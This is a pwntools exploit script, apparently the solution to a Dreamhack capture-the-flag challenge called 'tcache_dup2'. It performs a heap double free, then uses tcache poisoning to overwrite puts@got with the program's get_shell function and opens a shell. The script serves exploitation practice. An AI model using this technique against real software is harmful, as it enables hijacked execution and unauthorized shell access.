from pwn import *

p = process("./tcache_dup2")
e = ELF("./tcache_dup2")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", checksec=False)

#context.log_level = 'debug'

get_shell = e.symbols['get_shell']
puts_got = e.got['puts']


def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))


def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def modify(idx, size, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))


# Double Free
create(0x10, "dreamhack")
delete(0)

modify(0, 0x10, "B"*8 + "\x00")
delete(0)

# Overwrite puts@got -> get_shell
modify(0, 0x10, p64(puts_got))
create(0x10, 'C'*8)
create(0x10, p64(get_shell))

p.interactive()